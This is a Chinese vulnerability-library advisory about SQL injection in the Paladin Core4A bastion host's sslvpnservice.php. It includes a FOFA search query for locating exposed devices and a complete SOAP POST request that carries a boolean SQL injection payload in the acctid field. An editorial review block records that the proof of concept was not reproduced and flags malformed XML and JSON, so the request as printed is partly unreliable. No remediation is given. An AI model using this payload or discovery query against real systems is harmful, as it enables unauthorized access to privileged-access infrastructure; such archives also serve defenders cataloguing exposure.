---
source: "wy876 漏洞文库"
id: "vw-aad6646c9cb61ddc1630605f"
entity_id: "ve-aad6646c9cb61ddc1630605f"
schema_version: "1"
title: "帕拉迪堡垒机sslvpnservice.php存在SQL注入漏洞"
product: "帕拉迪Core4A堡垒机"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "带PHPSESSID及业务token/user，角色未知；无版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E5%B8%95%E6%8B%89%E8%BF%AA%E7%BD%91%E7%BB%9C/%E5%B8%95%E6%8B%89%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BAsslvpnservice.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/yxne8q3lvcvl18bl"
source_status: "recorded"
---

# 帕拉迪堡垒机sslvpnservice.php存在SQL注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：帕拉迪Core4A堡垒机
- 本文讨论：sslvpnservice.php getAccountDetail acctid SQLi
- 版本、权限与配置前提：带PHPSESSID及业务token/user，角色未知；无版本
- 资料类型：SOAP SQL注入请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- XML元素使用SOAP-ENV但声明SOAPENV，命名空间前缀未绑定
- JSON acctid字符串内原始换行破坏JSON；User-Agent折行无合法续行
- 单布尔载荷无真/假响应对照，令牌前提未述，缺修复
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- token获取和版本、SQL判断证据待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
帕拉迪堡垒机支持移动管理和运维BYOD。移动管理和运维逐渐成为刚需，通过专用App从管理者和运维者角度进行多方位管理和操作。对服务器和网络中的各种帐号都能一键收集，对其状态一目了然，并做到最全单点登录。可编程环境通道。可进行自动化程序穿透，通过API接口，让运维自动化不再是法外之地，整个自动化过程可管理可审计，帕拉迪堡垒机sslvpnservice.php存在SQL注入漏洞

# 二、影响版本
帕拉迪堡垒机

# 三、资产测绘
+ fofa `app="帕拉迪Core4A-UTM"`
+ 特征


# 四 、漏洞复现
```http
POST /sslvpnservice.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/89.0.4389.90 Safari/537.36
Connection: close
Cookie: PHPSESSID=8fdj8pske96v2qdg13g36u8872; think_language=zh-cn
Content-Type: text/xml
Content-Length: 580

<?xml version="1.0" encoding="ISO-8859-1"?>
<SOAP-ENV:Envelope SOAPENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAPENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAPENC="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<getAccountDetail>
<data>
{"token":"4e28b56969e59a18d72d0050a47f812a","user":"superman","acctid":"-1' or
1=if(1=1,1,2) limit 0,1 -- a","index":"1"}</data>
</getAccountDetail>
</SOAP-ENV:Body></SOAP-ENV:Envelope>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yxne8q3lvcvl18bl>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
